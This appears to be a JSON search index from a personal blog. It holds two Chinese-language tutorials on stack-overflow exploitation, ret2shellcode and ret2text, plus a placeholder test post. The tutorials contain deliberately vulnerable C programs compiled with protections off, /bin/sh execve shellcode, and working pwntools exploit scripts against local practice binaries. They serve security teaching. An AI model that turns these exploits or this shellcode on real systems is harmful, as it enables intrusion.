[{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"返回到 shellcode（return to shellcode）攻击。主要运用攻击者在堆栈上写入的 shellcode，然后覆盖程序的返回地址，控制程序的控制流返回到注入的 shellcode，从而执行恶意代码。通过以下代码为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; char buf2[100]; int main(void) { setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); long page_size = sysconf(_SC_PAGESIZE); void *page_start = (void *)((long)buf2 \u0026amp; ~(page_size - 1)); // Linux 内核2.6.18-8后，默认不再同时具有可写与可执行的段。这种机制被称为\u0026#34;W^X\u0026#34;（Write XOR Execute） if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) { perror(\u0026#34;mprotect\u0026#34;); return 1; } char buf[100]; printf(\u0026#34;No system for you this time !!!\\n\u0026#34;); gets(buf); strncpy(buf2, buf, 100); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 使用 gcc 编译代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以看出程序存在栈溢出漏洞，输入的数据的前100个字节会被复制到 buf2， buf2 所处的页面被手动设置为可执行。可以在 buf2 中注入 shellcode，再覆盖程序返回地址将其指向 buf2.。以下是一个简单的 x86_64 汇编代码，用来调用 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL)：\n; shellcode.s section .text ; 定义代码段（text section），存放可执行代码。 global _start ; 程序入口 _start: ; 将 \u0026#34;/bin/sh\\0\u0026#34; 压栈 xor rax, rax push rax ; \u0026#34;\\0\u0026#34;，字符串结束标志 mov rbx, 0x68732f2f6e69622f ; \u0026#34;/bin//sh\u0026#34;的 ascii 表示，使用小端法表示 push rbx ; 设置 execve 参数，根据64位系统的调用约定: ; RDI - 第一个参数 ; RSI - 第二个参数 ; RDX - 第三个参数 mov rdi, rsp ; Address of \u0026#39;/bin//sh\u0026#39; xor rsi, rsi ; argv = NULL xor rdx, rdx ; envp = NULL ; 调用 execve push 59 ; x86_64架构中，59是 execve 的系统调用编号 pop rax syscall ; 执行系统调用 使用 IDA 查看生成的 example 程序，可以看到输入的数据储存在栈上距离 rbp 0x80字节。buf2 位于 0x404080 处\n.bss:0000000000404080 public buf2 .bss:0000000000404080 ; char buf2[104] .bss:0000000000404080 buf2 db 68h dup(?) ; DATA XREF: main+5C↑o .bss:0000000000404080 ; main+C3↑o ------------------------------------------------------------------------------------ int __fastcall main(int argc, const char **argv, const char **envp) { char src[112]; // [rsp+0h] [rbp-80h] BYREF ...... puts(\u0026#34;No system for you this time !!!\u0026#34;); gets(src); strncpy(buf2, src, 0x64uLL); printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/usr/bin/env python3 # -*- coding: utf-8 -*- # This exploit template was generated via: # $ pwn template from pwn import * # Set up pwntools for the correct architecture context.update(arch=\u0026#34;amd64\u0026#34;) exe = \u0026#34;./ret2shellcode\u0026#34; # Many built-in settings can be controlled on the command-line and show up # in \u0026#34;args\u0026#34;. For example, to dump all data sent/received, and disable ASLR # for all created processes... # ./exploit.py DEBUG NOASLR def start(argv=[], *a, **kw): \u0026#34;\u0026#34;\u0026#34;Start the exploit against the target.\u0026#34;\u0026#34;\u0026#34; if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) else: return process([exe] + argv, *a, **kw) # Specify your GDB script here for debugging # GDB will be launched if the exploit is run via e.g. # ./exploit.py GDB gdbscript = \u0026#34;\u0026#34;\u0026#34; b main continue \u0026#34;\u0026#34;\u0026#34;.format(**locals()) # =========================================================== # EXPLOIT GOES HERE # =========================================================== io = start() # shellcode = asm(shellcraft.sh()) # pwntools 也提供许多内置的 shellcode shellcode = asm(\u0026#34;\u0026#34;\u0026#34; xor rax, rax push rax mov rbx, 0x68732f2f6e69622f push rbx mov rdi, rsp /* address of \u0026#34;/bin//sh\u0026#34; */ xor rsi, rsi /* argv = NULL */ xor rdx, rdx /* envp = NULL */ push 59 pop rax syscall \u0026#34;\u0026#34;\u0026#34;) buf2_addr = 0x404080 payload = shellcode.ljust(0x80 + 8, b\u0026#34;a\u0026#34;) + p64(buf2_addr) io.sendline(payload) io.interactive() ","date":"2 June 2024","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2shellcode/","section":"Posts","summary":"","title":"ret2shellcode","type":"posts"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/tags/rop/","section":"Tags","summary":"","title":"Rop","type":"tags"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/series/rop/","section":"Series","summary":"","title":"Rop","type":"series"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/tags/stack-overflow/","section":"Tags","summary":"","title":"Stack Overflow","type":"tags"},{"content":"","date":"2 June 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" ","date":"2 June 2024","externalUrl":null,"permalink":"/","section":"Welcome to my blog","summary":"","title":"Welcome to my blog","type":"page"},{"content":"返回到文本段（Return to text segment）攻击，这是一种利用程序中的可执行代码段（text segment）来执行恶意操作的攻击。这种技术有几个基本前提：\n程序中的某些代码位置是可预测的，同时在不同运行时是固定的 只需要利用程序的现有代码，无需注入新的代码 可以通过一个简单的例子说明这个问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // example.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int success() { puts(\u0026#34;called success()!\\n\u0026#34;); return system(\u0026#34;/bin/sh\u0026#34;); } void vuln() { char buf[32]; gets(buf); puts(buf); } int main() { vuln(); return 0; } 上述代码中的库函数 gets 是一个危险函数，通过以下给出的 gets 的一个实现，可以看出这个函数引起的严重问题。它从标准输入（stdin）读入一行，在遇到一个回车或某个错误时停止。gets 从不检查输入的长度，这导致它很容易被利用来进行栈溢出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /* Read a newline-terminated string from stdin into S, removing the trailing newline. Return S or NULL. */ char * gets (char *s) { register char *p = s; register int c; FILE *stream = stdin; if (!__validfp (stream) || p == NULL) { __set_errno (EINVAL); return NULL; } if (feof (stream) || ferror (stream)) return NULL; while ((c = getchar ()) != EOF) if (c == \u0026#39;\\n\u0026#39;) break; else *p++ = c; *p = \u0026#39;\\0\u0026#39;; /* Return null if we had an error, or if we got EOF before writing any characters. */ if (ferror (stream) || (feof (stream) \u0026amp;\u0026amp; p == s)) return NULL; return s; } 通过 gcc 编译上述代码\n1 2 3 4 5 $ gcc -std=c99 \\ # 使用 C99 标准，C99 之后不支持 gets 函数 -no-pie \\ # 关闭地址随机化 -fno-stack-protector \\ # 关闭栈破坏检测 -z execstack \\ # 关闭栈不可执行 example.c -o example 可以利用 checksec 来检查编译出文件的安全性\n1 2 3 4 5 6 7 8 $ checksec example Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments 使用 IDA 反汇编程序，我们可以看到对应函数的汇编表示，\n; Attributes: bp-based frame public vuln vuln proc near s= byte ptr -20h ; __unwind { push rbp mov rbp, rsp sub rsp, 20h lea rax, [rbp+s] mov rdi, rax call _gets lea rax, [rbp+s] mov rdi, rax ; s call _puts nop leave retn ; } // starts at 40116A vuln endp 可以看出当程序运行时，vuln 函数在运行时的栈帧如下所示。如果提供大于32字节的数据时栈帧中保存的栈指针和返回地址。因此我们可以输入大于32字节的数据来覆盖返回地址，从而控制程序的执行流。\n1 2 3 4 5 6 7 8 9 | rsp | |:--------------:| | char buf[0] | | ... | | char buf[31] | |:--------------:| | rbp | |:--------------:| | return address | 以下是利用 pwntools 编写的 wp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) sh = process(\u0026#39;./example\u0026#39;) # gdb.attach(sh) success_addr = 0x401146 payload = b\u0026#39;a\u0026#39; * 0x20 # buf[32] payload += b\u0026#39;b\u0026#39; * 8 # rbp # 伪造返回地址，跳转到 nop ; ret，Ubuntu18及以上版本的系统要求在调用system函数时栈16字节对齐， # 即调用system函数时rsp的值必须是16的倍数，也就是末位为0，否则无法执行。这里多进行一次 rtn 以实现对齐 payload += p64(0x40112f) payload += p64(success_addr) # success 函数地址 sh.sendline(payload) sh.interactive() NOTE:\n上述代码中，没有立即跳转到 success() 的运行地址，这是源于 system() 函数运行时的栈16字节对齐要求。\n","date":"1 June 2024","externalUrl":null,"permalink":"/posts/pwn/stack_overflow/ret2text/","section":"Posts","summary":"","title":"ret2text","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":" an example to get you started\nThis is a heading # This is a subheading # This is a subsubheading # This is a subsubsubheading # This is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\ntest1 test2 test22 test23 item1 item2 item3 item3a item3b We\u0026rsquo;re living the future so the present is our past.\ncode # 1 2 3 4 5 6 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, world!\u0026#34;); return 0; } 1 print(\u0026#39;hello\u0026#39;) table # a b one two 3 4 math # $$ \\sum_{i=2}^ni=\\frac{n(n+1)}{2}-1 $$\n","date":"25 May 2024","externalUrl":null,"permalink":"/posts/test/hello_world/","section":"Posts","summary":"","title":"hello world","type":"posts"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/test/","section":"Tags","summary":"","title":"Test","type":"tags"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/series/test/","section":"Series","summary":"","title":"Test","type":"series"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/categories/test/","section":"Categories","summary":"","title":"Test","type":"categories"},{"content":"","date":"25 May 2024","externalUrl":null,"permalink":"/tags/welcome/","section":"Tags","summary":"","title":"Welcome","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"}]